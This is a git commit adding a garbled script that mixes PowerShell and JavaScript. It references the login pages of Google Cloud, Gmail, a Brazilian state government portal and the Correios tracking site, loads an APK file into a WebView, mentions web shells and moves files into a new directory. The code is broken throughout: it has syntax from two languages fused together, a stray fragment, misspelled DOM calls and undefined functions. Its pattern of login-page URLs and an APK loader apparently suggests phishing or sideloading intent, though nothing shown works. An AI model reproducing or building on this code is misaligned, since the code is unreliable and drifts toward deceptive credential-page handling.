7fa032578b55703e404d1bc2efa79b97aabc8071
callonlogin-ops <callonlogin@gmail.com>
2026-09-16 10:26:47 -0300

    Add files via upload

---
+++ LoadCode.js.sh
@@ -0,0 +1,92 @@
+# PowerShell Translation
+
+$Clouds = "https://console.cloud.google.com/auth/clients"
+$sitesgoogle = "https://sites.google.com"
+$play = "https://www.lojaintegrada.com.br/"
+$playset = "https://www.gmail.com.br/"
+$CPFnew = "https://ibioseg.pi.gov.br/signin?login.xhtml"
+$playip = "https://rastreamento.correios.com.br/app/index.php"
+
+Write-Output $play
+$load = $play
+Write-Output $load
+
+Write-Output $play
+$load = $play
+Write-Output $load
+
+Write-Output $play
+$load = $play
+Write-Output $load
+r/app/index.php ));
+    $playip = "https://rastreamento.correios.com.br/app/index.php"
+    
+    # Logic from the provided PS section in the source:
+    # $play = $playip
+    $play = $playip
+    
+    # $load = $CPFnew
+    $load = $cpfNew
+    
+    # Write-Output $play
+    Write-Output $play
+    
+    # $ip = $load
+    $ip = $load
+    
+    # Write-Output $ip
+    Write-Output $ip
+}
+function Load-Data(){
+var form=createElemente(form);
+var play.src=documentGetById(form.value(play.src=https://www.lojaintegrada.com.br/ =Clouds.src=sitesgoogle.src));
+var Clouds;
+Clouds=Clouds.src="https://console.cloud.google.com/auth/clients ";
+var sitesgoogle;
+sitesgoogle=sitesgoogle.src="https://sites.google.com";
+var load.src=eval(console.log(play));
+ var ip.src=console.log(load);
+var playset.src=documentGetById(form.value(playset.src=https://www.gmail.com.br/ ));
+var load.src=eval(console.log(play=playip.src=CPFnew.src));
+ var ip.src=console.log(load);
+var CPFnew;
+CPFnew.src=documentGetById(form.vaule(CPFnew.src=https://ibioseg.pi.gov.br/signin?login.xhtml
+));
+var playip.src=documentGetById(form.value(playip.src=https://rastreamento.correios.com.br/app/index.php ));
+var load.src=eval(console.log(play));
+ var ip.src=console.log(load);
+
+}
+
+console.log(Play());
+$resultweb = Play
+Write-Host $resultweb
+# console.log(Load-Data());
+$result = Load-Data
+Write-Host $result
+
+function Play(){
+# Webview File Loader
+
+const webView = new WebView();
+const filePath = "file:///android_assets/File.zip.apk";
+
+webView.loadUrl(filePath);
+
+}
+$ip = "dir/"
+$url = New-Item -ItemType Directory -Path $ip -Force
+
+# Note: move_uploaded_file is a PHP-style function often found in JS-based web shells or scripts.
+# In PowerShell, we use Move-Item.
+# The original JS snippet: move_uploaded_file(play()=set(),url,)
+# contains a syntax error/assignment inside a function call (play()=set()).
+# Interpreting this as moving the result of the assignment to the destination $url.
+
+$playResult = Play
+$setValue = Load-Data
+$playResult = $setValue
+
+Move-Item -Path $playResult -Destination $url.FullName -Force
+
+
